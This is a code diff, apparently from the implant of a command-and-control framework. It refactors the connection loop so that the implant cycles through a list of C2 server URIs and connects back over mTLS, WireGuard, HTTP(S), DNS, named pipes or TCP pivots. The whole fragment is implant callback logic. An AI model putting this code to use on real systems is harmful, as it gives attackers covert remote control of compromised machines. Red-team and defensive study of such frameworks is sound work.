@@ -130,130 +130,135 @@ func (c *Connection) RequestResend(data []byte) {
 }
 
 // StartConnectionLoop - Starts the main connection loop
-func StartConnectionLoop() *Connection {
+func StartConnectionLoop(c2s []string) *Connection {
 
 	// {{if .Config.Debug}}
 	log.Printf("Starting session connection loop ...")
 	// {{end}}
 
+	abort := make(chan struct{})
+	defer func() {
+		abort <- struct{}{}
+	}()
+
+	c2Generator := C2Generator(c2s, abort)
 	connectionAttempts := 0
-	for connectionAttempts < maxErrors {
+	for uri := range c2Generator {
+		for connectionAttempts < maxErrors {
+			var connection *Connection
+			var err error
 
-		var connection *Connection
-		var err error
+			// {{if .Config.Debug}}
+			log.Printf("Next CC = %s", uri.String())
+			// {{end}}
 
-		uri := nextCCServer()
-		// {{if .Config.Debug}}
-		log.Printf("Next CC = %s", uri.String())
-		// {{end}}
+			switch uri.Scheme {
 
-		switch uri.Scheme {
+			// *** MTLS ***
+			// {{if .Config.MTLSc2Enabled}}
+			case "mtls":
+				connection, err = mtlsConnect(uri)
+				if err == nil {
+					activeC2 = uri.String()
+					activeConnection = connection
+					return connection
+				}
+				// {{if .Config.Debug}}
+				log.Printf("[mtls] Connection failed %s", err)
+				// {{end}}
+				connectionAttempts++
+				// {{end}}  - MTLSc2Enabled
+			case "wg":
+				// *** WG ***
+				// {{if .Config.WGc2Enabled}}
+				connection, err = wgConnect(uri)
+				if err == nil {
+					activeC2 = uri.String()
+					activeConnection = connection
+					return connection
+				}
+				// {{if .Config.Debug}}
+				log.Printf("[wg] Connection failed %s", err)
+				// {{end}}
+				connectionAttempts++
+				// {{end}}  - WGc2Enabled
+			case "https":
+				fallthrough
+			case "http":
+				// *** HTTP ***
+				// {{if .Config.HTTPc2Enabled}}
+				connection, err = httpConnect(uri)
+				if err == nil {
+					activeC2 = uri.String()
+					activeConnection = connection
+					return connection
+				}
+				// {{if .Config.Debug}}
+				log.Printf("[%s] Connection failed %s", uri.Scheme, err)
+				// {{end}}
+				connectionAttempts++
+				// {{end}} - HTTPc2Enabled
 
-		// *** MTLS ***
-		// {{if .Config.MTLSc2Enabled}}
-		case "mtls":
-			connection, err = mtlsConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
+			case "dns":
+				// *** DNS ***
+				// {{if .Config.DNSc2Enabled}}
+				connection, err = dnsConnect(uri)
+				if err == nil {
+					activeC2 = uri.String()
+					activeConnection = connection
+					return connection
+				}
+				// {{if .Config.Debug}}
+				log.Printf("[dns] Connection failed %s", err)
+				// {{end}}
+				connectionAttempts++
+				// {{end}} - DNSc2Enabled
+
+			case "namedpipe":
+				// *** Named Pipe ***
+				// {{if .Config.NamePipec2Enabled}}
+				connection, err = namedPipeConnect(uri)
+				if err == nil {
+					activeC2 = uri.String()
+					activeConnection = connection
+					return connection
+				}
+				// {{if .Config.Debug}}
+				log.Printf("[namedpipe] Connection failed %s", err)
+				// {{end}}
+				connectionAttempts++
+				// {{end}} -NamePipec2Enabled
+
+			case "tcppivot":
+				// {{if .Config.TCPPivotc2Enabled}}
+				connection, err = tcpPivotConnect(uri)
+				if err == nil {
+					activeC2 = uri.String()
+					activeConnection = connection
+					return connection
+				}
+				// {{if .Config.Debug}}
+				log.Printf("[tcppivot] Connection failed %s", err)
+				// {{end}}
+				connectionAttempts++
+				// {{end}} -TCPPivotc2Enabled
+
+			default:
+				// {{if .Config.Debug}}
+				log.Printf("Unknown c2 protocol %s", uri.Scheme)
+				// {{end}}
 			}
-			// {{if .Config.Debug}}
-			log.Printf("[mtls] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}}  - MTLSc2Enabled
-		case "wg":
-			// *** WG ***
-			// {{if .Config.WGc2Enabled}}
-			connection, err = wgConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[wg] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}}  - WGc2Enabled
-		case "https":
-			fallthrough
-		case "http":
-			// *** HTTP ***
-			// {{if .Config.HTTPc2Enabled}}
-			connection, err = httpConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[%s] Connection failed %s", uri.Scheme, err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} - HTTPc2Enabled
 
-		case "dns":
-			// *** DNS ***
-			// {{if .Config.DNSc2Enabled}}
-			connection, err = dnsConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[dns] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} - DNSc2Enabled
-
-		case "namedpipe":
-			// *** Named Pipe ***
-			// {{if .Config.NamePipec2Enabled}}
-			connection, err = namedPipeConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} -NamePipec2Enabled
-
-		case "tcppivot":
-			// {{if .Config.TCPPivotc2Enabled}}
-			connection, err = tcpPivotConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[tcppivot] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} -TCPPivotc2Enabled
-
-		default:
-			// {{if .Config.Debug}}
-			log.Printf("Unknown c2 protocol %s", uri.Scheme)
-			// {{end}}
+			// reconnect := GetReconnectInterval()
+			// // {{if .Config.Debug}}
+			// log.Printf("Sleep %s ...", reconnect)
+			// // {{end}}
+			// time.Sleep(reconnect)
 		}
-
-		// reconnect := GetReconnectInterval()
-		// // {{if .Config.Debug}}
-		// log.Printf("Sleep %s ...", reconnect)
-		// // {{end}}
-		// time.Sleep(reconnect)
 	}
 	// {{if .Config.Debug}}
 	log.Printf("[!] Max connection errors reached\n")
 	// {{end}}
-
 	return nil
 }
 
